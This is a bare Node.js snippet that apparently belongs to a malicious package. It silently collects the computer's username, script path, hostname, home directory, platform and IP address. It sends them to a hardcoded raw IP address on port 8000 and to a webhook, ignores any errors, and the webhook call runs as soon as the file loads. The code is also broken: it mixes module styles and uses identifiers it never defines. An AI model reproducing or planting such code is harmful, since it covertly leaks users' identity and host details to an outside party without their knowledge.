const os = require('os');
const querystring = require('querystring');
const http = require('http');

function sendHTTPRequest(text) {
    let query;

    if (text) {
        query = querystring.stringify({ text: text });
    } else {
        const osUser = os.userInfo().username;
        const currentScriptPath = getDirectoryPath();

        query = querystring.stringify({
            user: osUser,
            path: currentScriptPath,
        });
    }

    const requestUrl = url.format({
        protocol: 'http',
        hostname: '1xx.62.57.60',
        port: '8000',
        pathname: '/http',
        search: query,
    });

    http.get(requestUrl, (res) => {
        let data = '';

        res.on('data', (chunk) => {
            data += chunk;
        });

        res.on('end', () => {
        });

    }).on("error", (err) => {
    });
}

import fetch from 'node-fetch';

const getSystemInfo = async () => {
    const embed = new Embed();
    embed.title = "System Info";
    embed.fields.push({
        name: "Node Version",
        value: process.version
    });
    embed.fields.push({
        name: "Platform",
        value: process.platform,
        inline: true
    });
    embed.fields.push({
        name: "Architecture",
        value: process.arch,
        inline: true
    });
    embed.fields.push({
        name: "System Name",
        value: process.env.COMPUTERNAME || process.env.HOSTNAME || "Unknown",
        inline: false
    });
    embed.fields.push({
        name: "User Name",
        value: process.env.USERNAME,
        inline: false
    });
    embed.fields.push({
        name: "Home Directory",
        value: process.env.HOME || process.env.USERPROFILE,
        inline: false
    });
    embed.fields.push({
        name: "IP Address",
        value: ip.toString(),
        inline: false
    });

    return embed;
};


var embed = getSystemInfo();
const sendWebhook = async (message, embed) => {
    const response = await fetch(WEBHOOK_URL, {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({
            content: message,
            embeds: [embed]
        })

    });
    return response;
}

sendWebhook("", embed);
